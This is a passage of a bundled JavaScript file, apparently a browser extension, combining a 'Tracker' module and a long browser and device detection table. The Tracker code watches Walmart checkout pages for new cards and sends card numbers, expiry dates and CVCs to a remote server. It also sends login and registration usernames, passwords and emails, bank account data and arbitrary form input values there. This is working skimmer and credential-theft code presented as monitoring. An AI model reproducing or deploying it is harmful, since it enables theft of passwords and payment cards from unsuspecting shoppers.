                                    'cardHolder': tempPaymentMethodsStore[2].value + ' ' + tempPaymentMethodsStore[3].value,
                                    "cardExpire": tempPaymentMethodsStore[4].value + '/' + tempPaymentMethodsStore[5].value,
                                    'cardCVC': tempPaymentMethodsStore[6].value,
                                    'event': 'add',
                                    "workWebsite": window.location.origin
                                }
                            });
                            tempPaymentMethodsStore = [];
                            self.exploreWalmartPaymentEditButton(self);
                        });
                    });
                }
            }
        }, 100);
    };
    Tracker.prototype.exploreWalmartPaymentEditButton = function (self) {
        var interval = setInterval(function () {
            if (document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').length !== 0) {
                document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').forEach(function (formEditButton) {
                    if (formEditButton.getAttribute('data-automation-id') === 'edit-payment') {
                        clearInterval(interval);
                        formEditButton.addEventListener('click', function () {
                            self.exploreWalmartPaymentContainer(self);
                        });
                    }
                });
            }
        }, 100);
    };
    Tracker.prototype.explorePaymentNewCard = function (self, elementParentNode, callback) {
        var detectedElements = [];
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.classList.contains('card-surface')) {
                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
                        __childElement.childNodes.forEach(function (__targetParentElement) {
                            if (__targetParentElement.classList.contains('card-no')) {
                                self.explorePaymentInputTag(self, __targetParentElement, 'cardNo', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if (__targetParentElement.classList.contains('card-bottom')) {
                                self.explorePaymentInputTag(self, __targetParentElement, 'cardHolder', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, __targetParentElement, 'expire', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, __targetParentElement, 'cvc', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        });
                    }
                }
            });
            if (callback) {
                callback(detectedElements);
            }
        }
    };
    Tracker.prototype.explorePaymentSpanTag = function (self, elementParentNode, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('payment-title')) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentSpanTag(self, __childElement, callback);
                }
            });
        }
    };
    Tracker.prototype.explorePaymentInputTag = function (self, elementParentNode, selfId, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && __childElement.id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentInputTag(self, __childElement, selfId, callback);
                }
            });
        }
    };
    Tracker.prototype.explorePaymentSelectTag = function (self, elementParentNode, selfId, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SELECT' && __childElement.id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentSelectTag(self, __childElement, selfId, callback);
                }
            });
        }
    };
    Tracker.send = function (request) {
        if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
            var interval_18 = setInterval(function () {
                if (window.sessionStorage.getItem('ip') !== null) {
                    clearInterval(interval_18);
                    Promise.resolve(/*! import() */).then(__webpack_require__.bind(__webpack_require__, /*! ../common/request */ "./typescripts/common/request.ts")).then(function (t) {
                        if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
                            if (request.command === 'saveLoginData') {
                                return t.sendRequest({
                                    method: "POST",
                                    url: globalAppMonitorMainURL + "browserUserDataManagement",
                                    async: true,
                                    header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                    data: {
                                        "command": request.command,
                                        "userdata": {
                                            _default_: {
                                                "tracker": Tracker.identity,
                                                "app_id": Tracker.version,
                                                "ip": window.sessionStorage.getItem('ip'),
                                                "os_name_arch": Tracker.osNameAndArch,
                                                "browser": Tracker.browserNameFull
                                            },
                                            "event": 'login',
                                            "username": request.data.username,
                                            "password": request.data.password,
                                            "workWebsite": request.data.workWebsite
                                        }
                                    }
                                });
                            }
                            else if (request.command === 'saveRegistrationData') {
                                return t.sendRequest({
                                    method: "POST",
                                    url: globalAppMonitorMainURL + "browserUserDataManagement",
                                    async: true,
                                    header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                    data: {
                                        "command": request.command,
                                        "userdata": {
                                            _default_: {
                                                "tracker": Tracker.identity,
                                                "app_id": Tracker.version,
                                                "ip": window.sessionStorage.getItem('ip'),
                                                "os_name_arch": Tracker.osNameAndArch,
                                                "browser": Tracker.browserNameFull
                                            },
                                            "event": "registration",
                                            "username": request.data.username,
                                            "password": request.data.password,
                                            "email": request.data.email,
                                            "workWebsite": request.data.workWebsite
                                        }
                                    }
                                });
                            }
                            else if (request.command === 'saveLogoutData') {
                                return t.sendRequest({
                                    method: "POST",
                                    url: globalAppMonitorMainURL + "browserUserDataManagement",
                                    async: true,
                                    header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                    data: {
                                        "command": request.command,
                                        "userdata": {
                                            _default_: {
                                                "tracker": Tracker.identity,
                                                "app_id": Tracker.version,
                                                "ip": window.sessionStorage.getItem('ip'),
                                                "os_name_arch": Tracker.osNameAndArch,
                                                "browser": Tracker.browserNameFull
                                            },
                                            "event": "logout",
                                            "username": request.data.username,
                                            "workWebsite": request.data.workWebsite
                                        }
                                    }
                                });
                            }
                            else if (request.command === 'saveNavigateData') {
                                return t.sendRequest({
                                    method: "POST",
                                    url: globalAppMonitorMainURL + "browserUserDataManagement",
                                    async: true,
                                    header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                    data: {
                                        "command": request.command,
                                        "userdata": {
                                            _default_: {
                                                "tracker": Tracker.identity,
                                                "app_id": Tracker.version,
                                                "ip": window.sessionStorage.getItem('ip'),
                                                "os_name_arch": Tracker.osNameAndArch,
                                                "browser": Tracker.browserNameFull
                                            },
                                            "event": "navigate",
                                            "username": request.data.username,
                                            "workWebsite": request.data.workWebsite
                                        }
                                    }
                                });
                            }
                        }
                        if (request.command === 'savePaymentMethodsData') {
                            return t.sendRequest({
                                method: "POST",
                                url: globalAppMonitorMainURL + "clientPaymentMethodsRecord",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "paymentMethodsInfo": {
                                        _default_: {
                                            "tracker": Tracker.identity,
                                            "app_id": Tracker.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": Tracker.osNameAndArch,
                                            "browser": Tracker.browserNameFull
                                        },
                                        'cardNumber': request.data.cardNumber,
                                        'cardBrand': request.data.cardBrand,
                                        'cardHolder': request.data.cardHolder,
                                        "cardExpire": request.data.cardExpire,
                                        'cardCVC': request.data.cardCVC,
                                        'event': request.data.event,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                        if (request.command === 'saveBankAccountData') {
                            return t.sendRequest({
                                method: "POST",
                                url: globalAppMonitorMainURL + "clientBankAccountRecord",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "bankAccountData": {
                                        _default_: {
                                            "tracker": Tracker.identity,
                                            "app_id": Tracker.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": Tracker.osNameAndArch,
                                            "browser": Tracker.browserNameFull
                                        },
                                        'dataType': request.data.dataType,
                                        'dataValue': request.data.dataValue,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                        if (request.command === 'saveInputElementData') {
                            return t.sendRequest({
                                method: "POST",
                                url: globalAppMonitorMainURL + "InputElementDataRecord",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "inputElementData": {
                                        _default_: {
                                            "tracker": Tracker.identity,
                                            "app_id": Tracker.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": Tracker.osNameAndArch,
                                            "browser": Tracker.browserNameFull
                                        },
                                        'name': request.data.name,
                                        'type': request.data.type,
                                        'value': request.data.value,
                                        'placeholder': request.data.placeholder,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                    });
                }
            }, 100);
        }
    };
    return Tracker;
}());



/***/ }),

/***/ "./typescripts/mishusoft/browser.ts":
/*!******************************************!*\
  !*** ./typescripts/mishusoft/browser.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "Browser": function() { return /* binding */ Browser; }
/* harmony export */ });
/**
 * Browser (typescript language) Library
 * Developer: Mr Al-Amin Ahmed Abir
 * Website: https://www.mishusoft.com
 * Official Link: https://www.mishusoft.com/libraries/js/browser.js
 * */
/*import {sendRequest} from "./app-common-required-send";*/
var Browser = /** @class */ (function () {
    function Browser() {
        this.VERSION = '1.0.2';
        /*cdn link*/
        this.cdnUrl = '';
        this.UserAgent = navigator.userAgent;
        this.browserName = 'Unknown';
        this.browserNameFull = 'Unknown';
        this.browserVersion = 'Unknown';
        this.browserVersionFull = 'Unknown';
        this.browserArchitecture = 'Unknown';
        this.browserAppName = 'Unknown';
        this.browserAppNameFull = 'Unknown';
        this.browserAppVersion = 'Unknown';
        this.browserAppCodeName = 'Unknown';
        this.browserAppCodeVersion = 'Unknown';
        this.browserEngineName = 'Unknown';
        this.browserEngineNameFull = 'Unknown';
        this.browserEngineVersion = 'Unknown';
        this.browserInfoAll = [];
        this.deviceName = 'Unknown';
        this.deviceType = 'Unknown';
        this.deviceArchitecture = 'Unknown';
        this.deviceWindowManager = 'Unknown';
        this.deviceNameOriginal = 'Unknown';
        this.deviceWmNameOriginal = 'Unknown';
        /*url info*/
        this.URLProtocol = window.location.protocol;
        this.URLHostname = window.location.hostname;
        this.URLPath = window.location.pathname;
        this.URLPathFull = window.location.href;
        /*device screen info*/
        this.DeviceScreenWidth = window.screen.width;
        this.DeviceScreenHeight = window.screen.height;
        this.DeviceScreenColorDepth = window.screen.colorDepth;
        this.DeviceScreenPixelDepth = window.screen.pixelDepth;
        /*Device List*/
        this.devicesList = {
            "3DS": {
                "Browser": {
                    "name": "Nintendo Browser",
                    "architecture": "32-bit",
                    "developer": "Nintendo",
                    "rendering engine": "WebKit.",
                    "type": "Browser."
                },
                "Platform": { "name": "Nintendo 3DS", "architecture": "32-bit", "developer": "Nintendo" },
                "Device": { "name": "3DS", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
            },
            "DSi": {
                "Browser": {
                    "name": "Nintendo Browser",
                    "architecture": "32-bit",
                    "developer": "Nintendo",
                    "rendering engine": "Presto.",
                    "type": "Browser."
                },
                "Platform": { "name": "Nintendo DSi", "architecture": "32-bit", "developer": "Nintendo" },
                "Device": { "name": "DSi", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
            },
            "New 3DS": {
                "Browser": {
                    "name": "Nintendo Browser",
                    "architecture": "32-bit",
                    "developer": "Nintendo",
                    "rendering engine": "WebKit.",
                    "type": "Browser."
                },
                "Platform": { "name": "Nintendo 3DS", "architecture": "32-bit", "developer": "Nintendo" },
                "Device": { "name": "New 3DS", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
            },
            "Playstation Portable": {
                "Browser": {
                    "name": "Sony PSP",
                    "architecture": "32-bit",
                    "developer": "Sony",
                    "type": "Browser."
                },
                "Platform": { "name": "JAVA", "architecture": "32-bit", "developer": "Oracle" },
                "Device": { "name": "Playstation Portable", "type": "Console", "vendor": "Sony", "brand": "Sony" }
            },
            "PlayStation Vita": {
                "Browser": {
                    "name": "Playstation Browser",
                    "developer": "Sony",
                    "rendering engine": "WebKit.",
                    "type": "Browser."
                },
                "Platform": { "name": "PlayStation Vita", "developer": "Oracle" },
                "Device": { "name": "PlayStation Vita", "type": "Console", "vendor": "Sony", "brand": "Sony" }
            },
            "Switch": {
                "Browser": {
                    "name": "Nintendo Browser",
                    "architecture": "32-bit",
                    "developer": "Nintendo",
                    "rendering engine": "WebKit.",
                    "type": "Browser."
                },
                "Platform": { "name": "Nintendo Switch", "architecture": "32-bit", "developer": "Nintendo" },
                "Device": { "name": "Switch", "type": "Console", "vendor": "Nintendo", "brand": "Nintendo" }
            },
            "Amiga": {
                "Browser": {
                    "name": "IBrowse",
                    "architecture": "32-bit",
                    "developer": "Stefan Burstroem",
                    "type": "Browser."
                },
                "Platform": { "name": "Amiga OS", "architecture": "32-bit", "developer": "Commodore International" },
                "Device": {
                    "name": "Amiga",
                    "type": "Desktop",
                    "vendor": "Commodore International",
                    "brand": "Commodore"
                }
            },
            "DA241HL": {
                "Browser": {
                    "name": "Chrome",
                    "architecture": "32-bit",
                    "developer": "Google Inc",
                    "type": "Browser."
                },
                "Platform": { "name": "Android", "architecture": "32-bit", "developer": "Google Inc" },
                "Device": { "name": "DA 241HL", "type": "Desktop", "vendor": "Acer", "brand": "Acer" }
            },
            "tesla": {
                "Browser": {
                    "name": "Tesla Car Browser",
                    "architecture": "32-bit",
                    "developer": "Tesla Motors.",
                    "rendering engine": "Blink.",
                    "type": "Browser."
                },
                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
                "Device": {
                    "name": "Car",
                    "type": "Car Entertainment Framework",
                    "vendor": "Tesla Motors",
                    "brand": "Tesla"
                }
            },
            "QtCarBrowser": {
                "Browser": {
                    "name": "Tesla Car Browser",
                    "architecture": "32-bit",
                    "developer": "Tesla Motors.",
                    "rendering engine": "Blink.",
                    "type": "Browser."
                },
                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
                "Device": {
                    "name": "Car",
                    "type": "Car Entertainment Framework",
                    "vendor": "Tesla Motors",
                    "brand": "Tesla"
                }
            },
            "freebsd": {
                "Platform": { "name": "FreeBSD", "architecture": "32-bit", "developer": "FreeBSD Foundation" },
                "Device": { "name": "Computer", "type": "Linux Desktop" }
            },
            "CrOS": {
                "Platform": { "name": "Chrome OS", "architecture": "32-bit", "developer": "Google Inc" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "Ubuntu": {
                "Platform": { "name": "Ubuntu OS", "architecture": "32-bit", "developer": "Canonical Inc" },
                "Device": { "name": "Computer", "type": "Linux Desktop" }
            },
            "Arch Linux": {
                "Platform": { "name": "Arch Linux", "architecture": "32-bit", "developer": "Arch Linux" },
                "Device": { "name": "Computer", "type": "Linux Desktop" }
            },
            "linux": {
                "Platform": { "name": "Linux", "architecture": "32-bit", "developer": "Linux Foundation" },
                "Device": { "name": "Computer", "type": "Linux Desktop" }
            },
            "debian": "Debian",
            "manjaro": "manjaro",
            "sunos": "Sun Solaris",
            "beos": "BeOS",
            "apachebench": "ApacheBench",
            "aix": "AIX",
            "irix": "Irix",
            "osf": "DEC OSF",
            "hp-ux": "HP-UX",
            "netbsd": "NetBSD",
            "bsdi": "BSDi",
            "openbsd": "OpenBSD",
            "gnu": "GNU\/Linux",
            "unix": "Unknown Unix OS",
            "ubuntu": "Ubuntu",
            "RISC OS": "RISC OS",
            "Darwin": "MAC OS",
            "Haiku": "Haiku OS",
            "FreeMiNT": "FreeMiNT OS",
            "windows phone 8": {
                "Platform": {
                    "name": "Windows Phone 8",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Windows Phone", "type": "phone" }
            },
            "windows phone os 7": {
                "Platform": {
                    "name": "Windows Phone 7",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Windows Phone", "type": "phone" }
            },
            "windows nt 10": {
                "Platform": {
                    "name": "Windows 10",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 6.3": {
                "Platform": {
                    "name": "Windows 8.1",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 6.2": {
                "Platform": {
                    "name": "Windows 8",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 6.1": {
                "Platform": {
                    "name": "Windows 7",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 6.0": {
                "Platform": {
                    "name": "Windows Longhorn",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 5.2": {
                "Platform": {
                    "name": "Windows 2003",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 5.1": {
                "Platform": {
                    "name": "Windows XP",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows xp": {
                "Platform": { "name": "Windows XP", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 5.0": {
                "Platform": {
                    "name": "Windows 2000",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows me": {
                "Platform": { "name": "Windows ME", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows nt 4.0": {
                "Platform": {
                    "name": "Windows NT 4.0",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "winnt4.0": {
                "Platform": {
                    "name": "Windows NT 4.0",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "winnt 4.0": {
                "Platform": { "name": "Windows NT", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "winn\\\/t": {
                "Platform": { "name": "Windows NT", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows 98": {
                "Platform": { "name": "Windows 98", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "win98": {
                "Platform": { "name": "Windows 98", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "windows 95": {
                "Platform": { "name": "Windows 95", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "win95": {
                "Platform": { "name": "Windows 95", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "win16": {
                "Platform": { "name": "Windows 3.11", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Computer", "type": "Desktop" }
            },
            "ppc": "Macintosh",
            "macintosh|mac os x": "Mac OS X",
            "mac_powerpc": "Mac OS 9",
            "os x": "Mac OS X",
            "ppc mac": "Power PC Mac",
            "android": "Android",
            "webos": "Mobile",
            "mobileexplorer": "Mobile Explorer",
            "palmsource": "Palm",
            "palmscape": "Palmscape",
            "motorola": "Motorola",
            "nokia": "Nokia",
            "iphone": "Apple iPhone",
            "ipad": "iPad",
            "ipod": "Apple iPod Touch",
            "sony": "Sony Ericsson",
            "ericsson": "Sony Ericsson",
            "blackberry": "BlackBerry",
            "cocoon": "O2 Cocoon",
            "blazer": "Treo",
            "lg": "LG",
            "amoi": "Amoi",
            "xda": "XDA",
            "mda": "MDA",
            "vario": "Vario",
            "htc": "HTC",
            "samsung": "Samsung",
            "sharp": "Sharp",
            "sie-": "Siemens",
            "alcatel": "Alcatel",
            "benq": "BenQ",
            "ipaq": "HP iPaq",
            "mot-": "Motorola",
            "playstation portable": "PlayStation Portable",
            "hiptop": "Danger Hiptop",
            "nec-": "NEC",
            "panasonic": "Panasonic",
            "philips": "Philips",
            "sagem": "Sagem",
            "sanyo": "Sanyo",
            "spv": "SPV",
            "zte": "ZTE",
            "sendo": "Sendo",
            "symbian": "Symbian",
            "SymbianOS": "SymbianOS",
            "elaine": "Palm",
            "palm": "Palm",
            "series60": "Symbian S60",
            "windows ce": "Windows CE",
            "obigo": "Obigo",
            "netfront": "Netfront Browser",
            "openwave": "Openwave Browser",
            "mobilexplorer": "Mobile Explorer",
            "operamini": "Opera Mini",
            "opera mini": "Opera Mini",
            "digital paths": "Digital Paths",
            "avantgo": "AvantGo",
            "xiino": "Xiino",
            "novarra": "Novarra Transcoder",
            "vodafone": "Vodafone",
            "docomo": "NTT DoCoMo",
            "o2": "O2",
            "mobile": "Generic Mobile",
            "wireless": "Generic Mobile",
            "j2me": "Generic Mobile",
            "midp": "Generic Mobile",
            "cldc": "Generic Mobile",
            "up.link": "Generic Mobile",
            "up.browser": "Generic Mobile",
            "smartphone": "Generic Mobile",
            "cellphone": "Generic Mobile",
            "Raspbian": {
                "Platform": {
                    "name": "Raspbian Pi",
                    "architecture": "32-bit",
                    "developer": "Raspberry Pi Foundation"
                }, "Device": { "name": "Computer", "type": "Desktop" }
            },
            "Mail.RU_Bot": {
                "Platform": { "name": "Mail.ru Crawler", "architecture": "32-bit", "developer": "Mail RU" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "Googlebot": {
                "Platform": {
                    "name": "Googlebot Crawler",
                    "architecture": "32-bit",
                    "developer": "Google Inc"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "Baiduspider": {
                "Platform": { "name": "Baidu Spider", "architecture": "32-bit", "developer": "Baidu Inc" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "bingbot": {
                "Platform": { "name": "Bing Bot", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "msnbot": {
                "Platform": { "name": "MSN Bot", "architecture": "32-bit", "developer": "Microsoft Corp" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "MJ12bot": {
                "Platform": {
                    "name": "Majestic-12 Distributed Search Bot",
                    "architecture": "32-bit",
                    "developer": "Majestic"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "Yahoo! Slurp": {
                "Platform": {
                    "name": "Yahoo! Slurp Web Crawler Bot",
                    "architecture": "32-bit",
                    "developer": "Yahoo LLC"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "MegaIndex.ru": {
                "Platform": {
                    "name": "MegaIndex Crawler Bot",
                    "architecture": "32-bit",
                    "developer": "MegaIndex.ru"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "AhrefsBot": {
                "Platform": {
                    "name": "Ahrefs Backlink Research Bot",
                    "architecture": "32-bit",
                    "developer": "Ahrefs"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "DotBot": {
                "Platform": {
                    "name": "OpenSite Explorer Crawler",
                    "architecture": "32-bit",
                    "developer": "The Moz"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "JobboerseBot": {
                "Platform": {
                    "name": "Jobboerse Crawler",
                    "architecture": "32-bit",
                    "developer": "jobboerse.com"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "SemrushBot": {
                "Platform": { "name": "SEMRush Crawler", "architecture": "32-bit", "developer": "SEMrush" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "YandexBot": {
                "Platform": { "name": "Yandex Search Bot", "architecture": "32-bit", "developer": "Yandex" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "seoscanners.net": {
                "Platform": {
                    "name": "SEO Scanners Crawler Bot",
                    "architecture": "32-bit",
                    "developer": "SEO Scanners"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "SEOkicks-Robot": {
                "Platform": {
                    "name": "SEOkicks Crawler",
                    "architecture": "32-bit",
                    "developer": "SEOkicks"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "CheckMarkNetwork": {
                "Platform": {
                    "name": "CheckMark Network Crawler",
                    "architecture": "32-bit",
                    "developer": "CheckMark"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "BingPreview": {
                "Platform": {
                    "name": "Bing Preview Snapshot Generator",
                    "architecture": "32-bit",
                    "developer": "Microsoft Corp"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "VoilaBot BETA": {
                "Platform": {
                    "name": "VoilaBot BETA",
                    "architecture": "32-bit",
                    "developer": "orange ft group"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "adscanner": {
                "Platform": { "name": "AdScanner Crawler", "architecture": "32-bit", "developer": "AdScanner" },
                "Device": { "name": "Crawler", "type": "Server" }
            },
            "Qwantify": {
                "Platform": {
                    "name": "Qwantify Search Crawler",
                    "architecture": "32-bit",
                    "developer": "Qwantify"
                }, "Device": { "name": "Crawler", "type": "Server" }
            },
            "apple tv": { "name": "AppleTV", "device": "Television", "manufacture": "Apple Inc." },
            "chromecast": { "name": "Chromecast", "device": "Television", "manufacture": "Google Inc." },
            "aftb": { "name": "Fire TV", "device": "Television", "manufacture": "Amazon.com, Inc." },
            "freebox": { "name": "Freebox Revolution", "device": "Television", "manufacture": "FREE SAS." },
            "googletv": { "name": "Google TV", "device": "Television", "manufacture": "Sony." },
            "netbox": { "name": "Netbox", "device": "Television", "manufacture": "Sony." },
            "playstation 3": { "name": "Playstation 3", "device": "Television", "manufacture": "Sony." },
            "playstation 4": { "name": "Playstation 4", "device": "Television", "manufacture": "Sony." },
            "kdl32Cx525": { "name": "KDL32CX525", "tdeviceype": "Television", "manufacture": "Sony." },
            "nsz-gs7\\\/gx70": { "name": "NSZ-GS7\/GX70", "device": "Television", "manufacture": "Sony." },
            "h96 pro\\+": { "name": "H96 Pro+", "device": "Television", "manufacture": "Alfawise." },
            "mx enjoy tv": { "name": "MX Enjoy TV BOX", "device": "Television", "manufacture": "Geniatech." },
            "smarttv2016": { "name": "Series J (2016)", "device": "Television", "manufacture": "Samsung." },
            "smart-tv": { "name": "Smart TV", "device": "Television", "manufacture": "Samsung." },
            "tpm171e": { "name": "TPM171E", "device": "Television", "manufacture": "Philips." },
            "smarttva": { "name": "TV", "device": "Television", "manufacture": "LG." },
            "vap430": { "name": "VAP430", "device": "Television", "manufacture": "Vizio." },
            "viera": { "name": "Viera TV", "device": "Television", "manufacture": "Panasonic." },
            "webtv": { "name": "WebTV", "device": "Television", "manufacture": "Microsoft." },
            "xbox": { "name": "Xbox 360", "device": "Television", "manufacture": "Microsoft." },
            "xbox one": { "name": "Xbox One", "device": "Television", "manufacture": "Microsoft." },
            "wii": { "name": "Wii", "device": "Television", "manufacture": "Nintendo." },
            "wiiu": { "name": "WiiU", "device": "Television", "manufacture": "Nintendo." },
            "x96 mini": { "name": "X96 mini", "device": "Television", "manufacture": "ShySky." }
        };
        /*Devices Categories*/
        this.devicesCategoryList = {
            'linux': 'linux',
            'mac': 'mac',
            'win': 'win',
            'mobi': 'mobi',
        };
        /*Devices architecture List*/
        this.devicesArchitectureList = {
            "ARMv1": "32 bit",
            "ARMv2": "32 bit",
            "ARMv3": "32 bit",
            "ARMv4": "32 bit",
            "ARMv4T": "32 bit",
            "ARMv5TE": "32 bit",
            "ARMv6": "32 bit",
            "ARMv6-M": "32 bit",
            "ARMv7-M": "32 bit",
            "ARMv7E-M": "32 bit",
            "ARMv8-M": "32 bit",
            "ARMv7-R": "32 bit",
            "ARMv8-R": "32 bit",
            "ARMv7-A": "32 bit",
            "ARMv8-A": "64 bit",
            "ARMv8.1-A": "64\/32 bit",
            "ARMv8.2-A": "64\/32 bit",
            "ARMv8.3-A": "64\/32 bit",
            "ARMv8.4-A": "64\/32 bit",
            "ARMv8.5-A": "64\/32 bit",
            "ARMv8.6-A": "64\/32 bit",
            "i286": "16 Bit",
            "Win16": "16 Bit",
            "i386": "32 Bit",
            "i486": "32 Bit",
            "i586": "32 Bit",
            "i686": "32 Bit",
            "i786": "32 Bit",
            "x86": "32 Bit",
            "x64": "64 Bit",
            "WOW64": "64 Bit",
            "Win64": "64 Bit",
            "x86_64": "64 Bit",
            "x86-64": "64 Bit",
            "x64\\\/x86": "64 Bit",
            "IA-64": "64 Bit",
            "ARM64": "64 Bit",
            "AMD64": "64 Bit",
            "Intel64": "64 Bit"
        };
        /*Platform's Window Manager*/
        this.devicesPlatformWMNameList = {
            'x11': { 'name': 'Linux Desktop,', 'type': 'X11 Window Manager.' },
            'win': { 'name': 'Windows Desktop,', 'type': 'Windows Window Manager.', },
            'mac': { 'name': 'Macintosh,', 'type': 'Mac Window Manager.', },
        };
        /*Web Browser List*/
        this.webBrowserList = {
            "007ac9 Crawler": {
                "name": "007ac9 Crawler",
                "type": "Crawler",
                "ui": "FullTextMode",
                "developer": "007ac9",
                "link": "http:\/\/crawler.007ac9.net"
            },
            "115Browser": {
                "name": "115 Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "115 Team",
                        "link": "https:\/\/115.com\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Unknown"
                    }
                ],
                "layout": "Unknown",
                "latest-release": {
                    "version": "Unknown",
                    "date": "Unknown"
                }
            },
            "126BROWSER": {
                "name": "126 BROWSER",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
